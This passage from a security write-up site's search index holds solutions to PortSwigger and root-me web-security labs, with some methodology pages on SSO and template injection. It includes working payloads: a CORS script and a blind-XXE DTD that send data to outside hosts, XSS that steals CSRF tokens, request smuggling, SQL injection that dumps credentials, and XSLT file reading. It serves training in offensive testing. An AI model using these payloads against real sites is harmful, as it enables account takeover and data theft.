    "c": "Portswigger Academy Web cache poisoning Labs Introduction  What?  Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users. Why?  A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on. How?  Web cache poisoning Web cache poisoning with an unkeyed header Web cache poisoning with an unkeyed cookie Web cache poisoning with multiple headers Targeted web cache poisoning using an unknown header Web cache poisoning via an unkeyed query string Web cache poisoning via an unkeyed query parameter Parameter cloaking Web cache poisoning via a fat GET request URL normalization Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria Combining web cache poisoning vulnerabilities Cache key injection Internal cache poisoning",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6c7139e485438445a92902327d7456bf",
    "u": "https://webapp.tymyrddin.dev/docs/auth/2",
    "t": "2FA simple bypass ",
    "c": "2FA simple bypass  Description  This lab ’s two-factor authentication can be bypassed. You have already obtained a valid username and password ( wiener:peter and carlos:montoya ), but do not have access to the user’s 2FA verification code. Reproduction and proof of concept  Log in to your own account wiener:peter . Your 2FA verification code will be sent to you by email. Click the Email client button to access your emails. Go to your account page and make a note of the URL. https://0ae300ee036172afc23f703800b90085.web-security-academy.net/my-account?id=wiener Log out of your account. Log in using the victim’s credentials carlos:montoya . When prompted for the verification code, manually change the URL to navigate to /my-account . The lab is solved when the page loads. https://0ae300ee036172afc23f703800b90085.web-security-academy.net/my-account?id=carlos Exploitability  An attacker will need to access Carlos’s account page.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "30735d5fb1c6ca6805c73a7ff0a3571d",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/16",
    "t": "Exploiting HTTP request smuggling to perform web cache poisoning ",
    "c": "Exploiting HTTP request smuggling to perform web cache poisoning  Description  This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The front-end server is configured to cache certain responses. Reproduction and proof of concept  Open a blog post, click Next post , and try smuggling the resulting request with a different Host header. POST / HTTP/1.1 Host: 0a4c003803748d35c226d17d00650068.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 129 Transfer-Encoding: chunked 0 GET /post/next?postId=3 HTTP/1.1 Host: anything Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=1 Observe that you can use this request to make the next request to the website get redirected to /post on a host of your choice. Go to your exploit server, and create a text/javascript file at /post with the contents: alert(document.cookie) Create a request to smuggle: POST / HTTP/1.1 Host: 0a4c003803748d35c226d17d00650068.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 180 Transfer-Encoding: chunked 0 GET /post/next?postId=3 HTTP/1.1 Host: exploit-0aee007003418db3c294d0b301a6004e.exploit-server.net Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=1 Make a second Repeater window with a separate request for /resources/js/tracking.js : GET /resources/js/tracking.js HTTP/1.1 Host: 0a4c003803748d35c226d17d00650068.web-security-academy.net Connection: close Send the first request once until you have a 302 response, then send the request for /resources/js/tracking.js multiple times. Sometimes this second request does not redirect as it is still using the cache, in which case go back to the POST smuggle request for another 302 and try again. It may take several times before the attack succeeds. If the attack has succeeded, the response to the request shows a redirect to the exploit server. Exploitability  An attacker will need to perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache would alert document.cookie . The lab simulates the activity of a victim user. Every few POST requests that an attacker makes to the lab, the victim user will make their own request. An attacker might need to repeat their attack a few times to ensure that the victim user’s request occurs as required.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5b086fc38a488b29804261ea6af3b0d2",
    "u": "https://webapp.tymyrddin.dev/docs/clickjacking/2",
    "t": "Clickjacking with form input data prefilled from a URL parameter ",
    "c": "Clickjacking with form input data prefilled from a URL parameter  This lab extends the above Basic clickjacking with CSRF token protection lab (above). The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an “Update email” button. Reproduction and proof of concept  Log in to the account on the target website. Create payload: The iframe src URL points to the target website vulnerable page. In this case, the page containing the “Update email” form, and depends on the unique lab-ID. An initial opacity of 0.1 to align the iframe actions and adjust the position values. Initial top and left values of resp 400px and 80px - to align the “Update email” button with the “Test me” decoy action. <style> iframe { position:relative; width:500px; height: 700px; opacity: 0.1; z-index: 2; } div { position: absolute; top: 400px; left: 80; z-index: 1; } </style> <div>Test me</div> <iframe src=\"https://LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com\"></iframe> Go to the exploit server and paste the payload into the body field of the form. Click Store and then View exploit . Hover over “Test me” to make sure the cursor changes to a hand indicating that the div element is positioned correctly. If it is not, change the position of the div element by modifying the top and left properties of the style sheet. Change “Test me” to “Click me”, set opacity to 0.0001 , and click Store . And Deliver exploit to victim Exploitability  An attacker needs to craft some HTML that frames the account page and fools the user into updating their email address by clicking on a “Click me” decoy. An account with credentials wiener:peter is available.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "2980ed9ee0b3ee4c274cc32c18c1f72a",
    "u": "https://webapp.tymyrddin.dev/docs/sockets/1",
    "t": "Manipulating WebSocket messages to exploit vulnerabilities ",
    "c": "Manipulating WebSocket messages to exploit vulnerabilities  Description  This online shop has a live chat feature implemented using WebSockets. Chat messages that you submit are viewed by a support agent in real time. Reproduction and proof of concept  Click Live chat and send a chat message. In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message. Using your browser, send a new message containing a < character. In Burp Proxy, find the corresponding WebSocket message and observe that the < has been HTML-encoded by the client before sending. {\"message\":\"&lt;\"} Ensure that Burp Proxy is configured to intercept WebSocket messages, then send another chat message. Edit the intercepted message to contain the payload: <img src=1 onerror='alert(1)'> Observe that an alert is triggered in your browser. This will also happen in the support agent’s browser. Exploitability  An attacker will need to use a WebSocket message to trigger an alert() popup in the support agent’s browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "31c4eaef0f579e8d5fec7fa9fbb94e9d",
    "u": "https://webapp.tymyrddin.dev/docs/cors/1",
    "t": "CORS vulnerability with basic origin reflection ",
    "c": "CORS vulnerability with basic origin reflection  Description  The Academy website for this lab has an insecure CORS configuration in that it trusts all origins. Reproduction and proof of concept  Start Burp, foxyproxy, and with intercept off, log in to the target site and access your account page. Review the HTTPhistory in Burp: The key is retrieved via an AJAX request to /accountDetails , and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS. Send the request to Burp Repeater , and resubmit it with the added header: Origin: https://whatever.com The origin is reflected in the Access-Control-Allow-Origin header, meaning the application allows an arbitrary (public) origin, and Access-Control-Allow-Credentials is also true. Create exploit (replacing lab-id ): <script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://lab-id.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script> Paste the exploit in the body field of the form in the exploit server. Click View exploit and check you land on the log page and your API key is in the URL. Deliver exploit to victim . Go to Access log ... 10.0.3.246 2023-01-02 21:51:33 +0000 \"GET /exploit/ HTTP/1.1\" 200 \"User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36\" 10.0.3.246 2023-01-02 21:51:33 +0000 \"GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22PY3qD4pkDMg4WDq1CZvntWDlPE0TFUyV%22,%20%20%22sessions%22:%20[%20%20%20%20%22pEGInv0rQCAB3vDmrgkuharW591raOlV%22%20%20]} HTTP/1.1\" 200 \"User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36\" 10.0.3.246 2023-01-02 21:51:33 +0000 \"GET /resources/css/labsDark.css HTTP/1.1\" 200 \"User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36\" Copy the administrator’s API key, and enter it as solution to the lab. Exploitability  An attacker would only have to create an exploit from a well-know template and convince the administrator into visiting the page with the exploit, potentially giving the attacker access to the administrator’s account and all associated privileges and resources. Impact  The attacker could disable account notifications, enable 2FA to lock them out, and transfer data to an arbitrary address. Remediation  An attacker can directly forge a request from any trusted origin. Apply protections to sensitive data, such as authentication and session management, in addition to configuring CORS.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e8b52d51f4c9454d9cd07a607ebb8857",
    "u": "https://webapp.tymyrddin.dev/docs/deserialisation/3",
    "t": "Using application functionality to exploit insecure deserialisation ",
    "c": "Using application functionality to exploit insecure deserialisation  Description  This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. Reproduction  Log in to wiener:peter . On the My account page, there is an option to delete the account by sending a POST request to /my-account/delete . Intercept the request. Study the session cookie using the Inspector panel. The serialised object has an avatar_link attribute, which contains the file path to your avatar. Edit the serialised data so that the avatar_link points to /home/carlos/morale.txt . Update the length indicator. The modified attribute looks like this: s:11:\"avatar_link\";s:23:\"/home/carlos/morale.txt\" Click Apply changes . The modified object will automatically be re-encoded and updated in the request. Forward the request. Your account will be deleted, along with Carlos’s morale.txt file. PoC  Exploitability  An attacker will need to log in to wiener:peter ; edit the serialised object in the session cookie and use it to delete the morale.txt file from Carlos’s home directory.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "acc91678de854aa101da8a364c824633",
    "u": "https://webapp.tymyrddin.dev/docs/xxe/5",
    "t": "Exploiting blind XXE to exfiltrate data using a malicious external DTD ",
    "c": "Exploiting blind XXE to exfiltrate data using a malicious external DTD  Description  This lab has a “Check stock” feature that parses XML input but does not display the result. Reproduction and proof of concept  Using Burp Suite Professional, go to the Burp menu, and launch the Burp Collaborator client. Click “Copy to clipboard” to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open. Place the Burp Collaborator payload into a malicious DTD file: <!ENTITY % file SYSTEM \"file:///etc/hostname\"> <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>\"> %eval; %exfil; Click “Go to exploit server” and save the malicious DTD file on your server. Click View exploit and take a note of the URL. Exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click Check stock , and intercept the resulting POST request in Burp Suite. Send to Repeater and insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"> %xxe;]> Go back to the Burp Collaborator client window, and click “Poll now”. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the /etc/hostname file. If you don’t see any interactions listed, wait a few seconds and try again. Exploitability  An attacker needs to exfiltrate the contents of the /etc/hostname file. A malicious DTD must be crafted and hosted on the exploit server and the check stock request must be tampered by adding a XML parameter entity. Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator’s default public server.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d933c90e8f4035b66622ca49df224262",
    "u": "https://webapp.tymyrddin.dev/docs/xss/16",
    "t": "Exploiting XSS to perform CSRF ",
    "c": "Exploiting XSS to perform CSRF  Description  The website in this lab contains a stored XSS vulnerability in the blog comments function. Reproduction and proof of concept  Log in using the credentials provided. On your user account page, notice the function for updating your email address. View the source for the page, and see the following information: You need to issue a POST request to /my-account/change-email , with a parameter called email . There is an anti-CSRF token in a hidden input called token. This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim’s email address. Enter the following payload in a blog comment: <script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name=\"csrf\" value=\"(\\w+)\"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script> This will make anyone who views the comment issue a POST request to change their email address to test@test.com .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f56724648db6c011582c47f82e5dd67e",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/19",
    "t": "Web cache poisoning via HTTP/2 request tunnelling ",
    "c": "Web cache poisoning via HTTP/2 request tunnelling  Description  This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and doesn’t consistently sanitize incoming headers. The front-end server doesn’t reuse the connection to the back-end, so isn’t vulnerable to classic request smuggling attacks. However, it is still vulnerable to request tunnelling. Reproduction and proof of concept  Send a request for GET / to Burp Repeater. Expand the Inspector’s Request Attributes section and change the protocol to HTTP/2. Using the Inspector, try smuggling an arbitrary header in the :path pseudo-header, making sure to preserve a valid request line for the downgraded request as follows: Name :path Value /?cachebuster=1 HTTP/1.1\\r\\n Foo: bar Observe that you still receive a normal response, confirming that you’re able to inject via the :path . Change the request method to HEAD and use the :path pseudo-header to tunnel a request for another arbitrary endpoint as follows: Name :path Value /?cachebuster=2 HTTP/1.1\\r\\n \\r\\n Host: 0af7002003f835c3c4e2c6d8005000ac.web-security-academy.net\\r\\n \\r\\n GET /post?postId=1 HTTP/1.1\\r\\n Foo: bar Note that we’ve ensured that the main request is valid by including a Host header before the split. We’ve also left an arbitrary trailing header to capture the HTTP/1.1 suffix that will be appended to the request line by the front-end during rewriting. Send the request and observe that you are able to view the tunnelled response. If you can’t, try using a different postId . Remove everything except the path and cachebuster query parameter from the :path pseudo-header and resend the request. Observe that you have successfully poisoned the cache with the tunnelled response. Now you need to find a gadget that reflects an HTML-based XSS payload without encoding or escaping it. Send a response for GET /resources and observe that this triggers a redirect to /resources/ . Try tunnelling this request via the :path pseudo-header, including an XSS payload in the query string as follows. Name :path Value /?cachebuster=3 HTTP/1.1\\r\\n Host: 0af7002003f835c3c4e2c6d8005000ac.web-security-academy.net\\r\\n \\r\\n GET /resources?<script>alert(1)</script> HTTP/1.1\\r\\n Foo: bar Observe that the request times out. This is because the Content-Length header in the main response is longer than the nested response to your tunnelled request. From the proxy history, check the Content-Length in the response to a normal GET / request and make a note of its value. Go back to your malicious request in Burp Repeater and add enough arbitrary characters after the closing \\script tag to pad the reflected payload so that the length of the tunnelled response will exceed the Content-Length you just noted. Send the request and confirm that the payload is successfully reflected in the tunnelled response. If it still responds with a timeout, there is not enough padding yet. While the cache is still poisoned, visit the home page using the same cachebuster query parameter and confirm that the alert() fires. In the Inspector, remove the cachebuster from the request and resend it until you have poisoned the cache. Keep resending the request every 5 seconds or so to keep the cache poisoned until the victim visits the home page and the lab is solved. Exploitability  An attacker will need to poison the cache in such a way that when the victim visits the home page, their browser executes alert(1) . A victim user will visit the home page every 15 seconds. Note: This lab supports HTTP/2 but doesn’t advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, you need to enable the Allow HTTP/2 ALPN override option and manually change the protocol to HTTP/2 using the Inspector. Please note that this feature is only available from Burp Suite Professional / Community 2021.9.1.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ec3120b94253793e459902b1b184068d",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/sso",
    "t": "Single-sign-on security (SSO) ",
    "c": "Single-sign-on security (SSO)  Cookie sharing, SAML, and OAuth are the three most common ways of implementing SSO. Each mechanism has unique strengths and weaknesses, and developers choose different approaches depending on their needs. The centralised nature of SSO provides a range of security benefits, but also makes SSO a high-profile target to attackers. A small misconfiguration in an SSO implementation can lead to large vulnerabilities. Steps  If the target application is using single sign-on, determine the SSO mechanism in use. If the application is using shared session cookies, try to steal session cookies by using subdomain takeovers. If the application uses a SAML-based SSO scheme, test whether the server is verifying SAML signatures properly. If the application uses OAuth, try to steal OAuth tokens by using open redirects. Create report. Subdomain takeovers  List the target’s subdomains. Find unregistered pages. Register the page. SAML vulnerabilities  Locate the SAML response. Analyse the response fields. Bypass the signature. Re-encode the message. OAuth token theft  Determine whether the website is using OAuth . Look for open redirect vulnerabilities . Try to exfiltrate the OAuth tokens by using one of the open redirects found. Escalation  SSO bypass usually means that attackers can take over the accounts of others. Therefore, these vulnerabilities are of high severity before any escalation attempts. You can escalate SSO bypass vulnerabilities by attempting to take over accounts with high privileges, such as admin accounts. After you have taken over a user’s account on one site, try to access the victim’s account on other sites by using the same OAuth credentials. You can escalate account takeovers by writing a script to automate the takeover of large numbers of accounts. And, you can try to leak data, execute sensitive actions, or take over the application by using the accounts taken over. Portswigger lab writeups  Authentication bypass via OAuth implicit flow Forced OAuth profile linking OAuth account hijacking via redirect_uri Stealing OAuth access tokens via an open redirect SSRF via OpenID dynamic client registration Stealing OAuth access tokens via a proxy page Remediation  Have SAML messages contain a timestamp of when the request was issued, when it expires or both. If the SAML message never expires or if the expiration is not honoured, there is a greater risk of a message falling into the hands of an attacker. Check the message for timestamps with an assertion. Pause the request until after the expiration has passed and then allow the request through to the SP. Also make sure the expiration window is reasonable, like 1-5 minutes. Message Replay: Assertions are to contain a unique ID that is only accepted once by the application. Test scenarios: Missing Signature, Invalid Signature, SAML from Different Recipient, Signature Wrapping, and XXE. Resources  Portswigger: OAuth grant types Portswigger: OAuth 2.0 authentication vulnerabilities OWASP: Testing for OAuth Weaknesses Portswigger Research Articles: Hidden OAuth attack vectors , March 2021 Daily Swig: Vulnerabilities in Single Sign-On services could be abused to bypass authentication controls , March 2021 Daily Swig: ‘Dirty dancing’ in OAuth: Researcher discloses how cyber-attacks can lead to account hijacking , July 2022",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "3b5e447d3e034310a6bb0b393afa571d",
    "u": "https://webapp.tymyrddin.dev/docs/pollution/6",
    "t": "Privilege escalation via server-side prototype pollution ",
    "c": "Privilege escalation via server-side prototype pollution  This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response. Reproduction and PoCs  Study the address change feature  Log in and visit your account page. Submit the form for updating your billing and delivery address. In Burp, go to the Proxy -> HTTP history tab and find the POST /my-account/change-address request. When submitting the form, the data from the fields is sent to the server as JSON. The server responds with a JSON object that appears to represent your user. This has been updated to reflect the new address information. Send the request to Burp Repeater. Identify a prototype pollution source  In Repeater, add a new property to the JSON with the name __proto__ , containing an object with an arbitrary property: \"__proto__\": { \"foo\":\"bar\" } Send the request. Notice that the object in the response now includes the arbitrary property that you injected, but no __proto__ property. This strongly suggests that you have successfully polluted the object’s prototype and that your property has been inherited via the prototype chain. Identify a gadget  Look at the additional properties in the response body. Notice the isAdmin property, which is currently set to false. Craft an exploit  Modify the request to try polluting the prototype with your own isAdmin property: \"__proto__\": { \"isAdmin\":true } Send the request. Notice that the isAdmin value in the response has been updated. This suggests that the object doesn’t have its own isAdmin property, but has instead inherited it from the polluted prototype. In the browser, refresh the page and confirm that you now have a link to access the admin panel . Go to the admin panel and delete the user carlos to solve the lab. Exploitability  An attacker will need to find a prototype pollution source that can be used to add arbitrary properties to the global Object.prototype ; identify a gadget property that can be used to escalate privileges; then access the admin panel and delete the user carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6712590164204975d805d97ef9b9c79b",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/17",
    "t": "SQL injection with filter bypass via XML encoding ",
    "c": "SQL injection with filter bypass via XML encoding  Description  This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. The database contains a users table, which contains the usernames and passwords of registered users. Reproduction and proof of concept  Identify the vulnerability  Observe that the stock check feature sends the productId and storeId to the application in XML format. Send the POST /product/stock request to Burp Repeater. In Burp Repeater, probe the storeId to see whether the input is evaluated. For example, try replacing the ID with mathematical expressions that evaluate to other potential IDs, for example: <storeId>1+1</storeId> Observe that the input appears to be evaluated by the application, returning the stock for different stores. Try determining the number of columns returned by the original query by appending a UNION SELECT statement to the original store ID: <storeId>1 UNION SELECT NULL</storeId> Observe that your request has been blocked due to being flagged as a potential attack. Bypass the WAF  As you’re injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select Extensions -> Hackvertor -> Encode -> dec_entities/hex_entities . Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF. Craft an exploit  Pick up where you left off, and deduce that the query returns a single column. When you try to return more than one column, the application returns 0 units, implying an error. As you can only return one column, you need to concatenate the returned usernames and passwords, for example: <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId> Send this query and observe that you’ve successfully fetched the usernames and passwords from the database, separated by a ~ character. Use the administrator’s credentials to log in and solve the lab.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9e855a5a0bbf83b5ace04122aaa0094f",
    "u": "https://webapp.tymyrddin.dev/docs/dom/7",
    "t": "Clobbering DOM attributes to bypass HTML filters ",
    "c": "Clobbering DOM attributes to bypass HTML filters  Description  This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. Reproduction and proof of concept  Analysis: The library uses the attributes property to filter HTML attributes. However, it is still possible to clobber the attributes property itself, causing the length to be undefined. This allows for injecting any attributes into the form element. For example, the onfocus attribute to smuggle the print() function. Go to one of the blog posts and create a comment containing the following HTML: <form id=x tabindex=0 onfocus=print()><input id=attributes> Go to the exploit server and add the following iframe to the body - Change the URL to contain your lab-id and make sure that the postId parameter matches the postId of the blog post into which you injected the HTML in the previous step: Store the exploit and deliver it to the victim. The next time the page loads, the print() function is called. When the iframe is loaded, after a 500ms delay, it adds the #x fragment to the end of the page URL. The delay is necessary to make sure that the comment containing the injection is loaded before the JavaScript is executed. This causes the browser to focus on the element with the ID x , which is the form we created inside the comment. The onfocus event handler then calls the print() function. Exploitability  An attacker needs to construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls the print() function. The attacker may need to use the exploit server in order to make the vector auto-execute in the victim’s browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "502dc8bee500aeab5fa3dfb6a19c6b93",
    "u": "https://webapp.tymyrddin.dev/docs/web-server/xslt-code-exec",
    "t": "XSLT code execution ",
    "c": "XSLT code execution  root-me challenge XSLT - Code execution : Find the vulnerability and exploit it to read the file .passwd in a subdirectory of the challenge tree. <?xml version=\"1.0\" encoding=\"utf-8\"?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" > <xsl:template match=\"/\"> <xsl:value-of select=\"php:function('opendir','/challenge/web-serveur/ch50/')\"/> <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - <xsl:value-of select=\"php:function('readdir')\"/> - </xsl:template></xsl:stylesheet> Check that .6ff3200bee785801f420fba826ffcdee directory too. It contains a .passwd . <?xml version=\"1.0\" encoding=\"utf-8\"?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" > <xsl:template match=\"/\"> <xsl:value-of select=\"php:function('file_get_contents','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/.passwd')\"/> </xsl:template></xsl:stylesheet>",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "eceb7b67b15e62fed48ad63f32f79a38",
    "u": "https://webapp.tymyrddin.dev/docs/auth/3",
    "t": "Password reset broken logic ",
    "c": "Password reset broken logic  Description  This lab ’s password reset functionality is vulnerable. Reproduction and proof of concept  With Burp running, click the Forgot your password? link and enter your own username wiener . Click the Email client button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want. In Burp, go to Proxy -> HTTP history and study the requests and responses for the password reset functionality. Observe that the reset token is provided as a URL query parameter in the reset email. Notice that when you submit your new password, the POST /forgot-password?temp-forgot-password-token request contains the username as hidden input. Send this request to Burp Repeater. In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the temp-forgot-password-token parameter in both the URL and request body. This confirms that the token is not being checked when you submit the new password. In your browser, request a new password reset and change your password again. Send the POST /forgot-password?temp-forgot-password-token request to Burp Repeater again. In Burp Repeater, delete the value of the temp-forgot-password-token parameter in both the URL and request body. Change the username parameter to carlos . Set the new password to whatever you want and send the request. POST /forgot-password?temp-forgot-password-token= HTTP/1.1 Host: 0a5f002304096594c337933500940061.web-security-academy.net Cookie: session=3c30RQATbFCz0qgpaKc45Qm5ajYc2omq User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 91 Origin: https://0a5f002304096594c337933500940061.web-security-academy.net Referer: https://0a5f002304096594c337933500940061.web-security-academy.net/forgot-password?temp-forgot-password-token=NiIOxWb7H8DwNylBdVs7GCoMgHObA4ii Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers Connection: close temp-forgot-password-token=&username=carlos&new-password-1=whatever&new-password-2=whatever In your browser, log in to Carlos’s account using the new password you just set. Click My account to solve the lab. Exploitability  An attacker will need to reset Carlos’s password then log in and access his My account page.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "64bbd9db8a0efe53bc859b18f42376c8",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/ssti",
    "t": "Template injection (SSTI) ",
    "c": "Template injection (SSTI)  Template engines are a type of software used to determine the appearance of a web page. Developers often overlook attacks that target these engines, called server-side template injections (SSTIs), yet they can lead to severe consequences, like remote code execution . They have become more common in the past few years. This bug is critical. The impact could be an RCE attack, not just in the affected server, but in other hosts on the same network. An SSTI found in an application exposes the application, web server, and network. To look for SSTI vulnerabilities, enter values to be evaluated and if you get a result, try harder. Steps  Identify any opportunity to submit user input to the application. Mark down candidates of template injection for further inspection. Detect template injection by submitting test payloads. You can use either payloads that are designed to induce errors, or engine-specific payloads designed to be evaluated by the template engine. If you find an endpoint that is vulnerable to template injection, determine the template engine in use. This will help you build an exploit specific to the template engine. Research the template engine and programming language that the target is using to construct an exploit. Try to escalate the vulnerability to arbitrary command execution. Create a proof of concept that does not harm the targeted system. A good way to do this is to execute touch template_injection_by_YOUR_NAME.txt to create a specific proof-of-concept file. Draft report. Look for user-input locations  Look for locations where you can submit user input to the application. These include URL paths, parameters, fragments, HTTP request headers and body, file uploads, and more. Templates are typically used to dynamically generate web pages from stored data or user input. For example, applications often use template engines to generate customized email or home pages based on the user’s information. So to look for template injections, look for endpoints that accept user input that will eventually be displayed back to the user. Since these endpoints typically coincide with the endpoints for possible XXS attacks, you can use the XSS strategies to identify candidates for template injection. Document these input locations for further testing. Detect template injection by submitting test payloads  Next, detect template injection vulnerabilities by injecting a test string into the input fields identified in the previous step. This test string should contain special characters commonly used in template languages. The string {{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx] ia designed to induce errors in popular template engines. ${...} is the special syntax for expressions in the FreeMarker and Thymeleaf Java templates. {{...}} is the syntax for expressions in PHP templates such as Smarty or Twig, and Python templates like Jinja2. <%= ... %> is the syntax for the Embedded Ruby template (ERB). Determine the template engine in use  Once you’ve confirmed the template injection vulnerability, determine the template engine in use to figure out how to best exploit that vulnerability. To escalate the attack, you will have to write your payload with a programming language that the particular template engine expects. Automation  tplmap can scan for template injections, determine the template engine in use, and construct exploits. While this tool does not support every template engine, it does provide a good starting point for the most popular ones. Escalation  The impact of server-side template injection vulnerabilities is generally critical, resulting in remote code execution by taking full control of the back-end server. Even without the code execution, the attacker may be able to read sensitive data on the server . There are also rare cases where an SSTI vulnerability is not critical, depending on the template engine. Once you’ve determined the template engine in use, you can escalate the vulnerability found. Most of the time, you can use the 7*7 payload : GET /display_name?name=7*7 Host: example.com But if you can show that the template injection can be used to accomplish more than simple mathematics, you can prove the impact of the bug and show the security team its value. The method of escalating the attack will depend on the template engine you are targeting. To learn more about it, read the official documentation of the template engine and the accompanying programming language. Being able to execute system commands might allow for reading sensitive system files like customer data and source code files, update system configurations, escalate their privileges on the system, and attack other machines on the network. Portswigger lab writeups  Basic server-side template injection Basic server-side template injection (code context) Server-side template injection using documentation Server-side template injection in an unknown language with a documented exploit Server-side template injection with information disclosure via user-supplied objects Server-side template injection in a sandboxed environment Server-side template injection with a custom exploit Remediation  Remediation for SSTI vulnerabilities depend on the different template engines in use. Do not create templates from user-controlled input. User input should be passed to the template using template parameters. Sanitise the input before passing it into the templates by removing unwanted and risky characters before parsing the data. This minimises the vulnerabilities for any malicious probing of your templates. If allowing risky characters is a requirement to render attributes of a template, assume that malicious code execution is inevitable, and use a sandbox within a safe environment. With the template environment in a docker container, you can use docker security to craft a secure environment that limits malicious activities. Resources  Server-Side Template Injection: RCE for the modern webapp, James Kettle Portswigger: Server-Side Template Injection OWASP: Testing for Server Side Template Injection Bug Bounty Bootcamp Bug Bounty Hunting Essentials Bug 